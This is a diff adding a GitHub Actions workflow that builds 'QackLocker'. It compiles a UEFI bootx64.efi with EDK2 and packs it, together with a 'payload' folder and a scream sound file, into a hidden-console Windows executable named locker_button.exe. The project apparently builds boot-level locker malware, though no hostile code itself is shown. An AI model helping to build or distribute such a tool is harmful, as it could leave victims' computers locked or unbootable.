@@ -1,0 +1,135 @@
+# language: YAML, file: .github/workflows/build.yml
+name: Build QackLocker
+
+on:
+  push:
+    branches: [main, master]
+  pull_request:
+    branches: [main, master]
+  workflow_dispatch:
+
+jobs:
+  # ─────────────────────────────────────────────
+  # JOB 1: Собрать UEFI-драйвер (bootx64.efi)
+  # ─────────────────────────────────────────────
+  build-efi:
+    name: Build UEFI Driver
+    runs-on: ubuntu-22.04
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+        with:
+          submodules: recursive
+
+      - name: Install build dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y git build-essential nasm uuid-dev python3 python3-pip
+
+      - name: Clone EDK2
+        run: |
+          git clone --recursive --depth 1 --branch edk2-stable202411 \
+            https://github.com/tianocore/edk2.git ~/edk2
+
+      - name: Setup EDK2 environment
+        run: |
+          cd ~/edk2
+          source edksetup.sh BaseTools
+          make -C BaseTools -j$(nproc)
+
+      - name: Link QackLocker package
+        run: |
+          ln -sfn "$GITHUB_WORKSPACE/QackLockerPkg" ~/edk2/QackLockerPkg
+
+      - name: Build QackLockerEfi.efi
+        run: |
+          cd ~/edk2
+          source edksetup.sh BaseTools
+          build -p QackLockerPkg/QackLockerPkg.dsc \
+                -a X64 \
+                -t GCC5 \
+                -b RELEASE
+
+      - name: Verify build output
+        run: |
+          OUT="$HOME/edk2/Build/QackLockerPkg/RELEASE_GCC5/X64/QackLockerEfi.efi"
+          if [ ! -f "$OUT" ]; then
+            echo "::error::Build failed — QackLockerEfi.efi not found"
+            exit 1
+          fi
+          cp "$OUT" "$GITHUB_WORKSPACE/bootx64.efi"
+          ls -la "$GITHUB_WORKSPACE/bootx64.efi"
+
+      - name: Upload bootx64.efi as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: bootx64-efi
+          path: bootx64.efi
+          if-no-files-found: error
+          retention-days: 30
+
+  # ─────────────────────────────────────────────
+  # JOB 2: Упаковать locker_button.exe
+  # ─────────────────────────────────────────────
+  build-exe:
+    name: Build Windows EXE
+    runs-on: windows-latest
+    needs: build-efi
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Download bootx64.efi from previous job
+        uses: actions/download-artifact@v4
+        with:
+          name: bootx64-efi
+          path: .
+
+      - name: Verify bootx64.efi present
+        shell: pwsh
+        run: |
+          if (-not (Test-Path "bootx64.efi")) {
+            throw "bootx64.efi not found — artifact download failed"
+          }
+          Get-Item bootx64.efi | Format-List Name, Length
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      - name: Install Python dependencies
+        shell: pwsh
+        run: |
+          python -m pip install --upgrade pip
+          pip install pyinstaller pillow pygame psutil wmi
+
+      - name: Build locker_button.exe with PyInstaller
+        shell: pwsh
+        run: |
+          pyinstaller --noconsole --onefile --name locker_button `
+            --distpath dist `
+            --workpath build `
+            --add-data "payload/assets;assets" `
+            --add-data "payload/scream.mp3;." `
+            --add-data "bootx64.efi;." `
+            --paths "${{ github.workspace }}/payload" `
+            "${{ github.workspace }}/payload/locker_button.py"
+
+      - name: Verify build output
+        shell: pwsh
+        run: |
+          if (-not (Test-Path "dist/locker_button.exe")) {
+            throw "PyInstaller failed — locker_button.exe not found"
+          }
+          Get-Item dist/locker_button.exe | Format-List Name, Length
+
+      - name: Upload locker_button.exe as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: locker_button-windows
+          path: dist/locker_button.exe
+          if-no-files-found: error
+          retention-days: 30
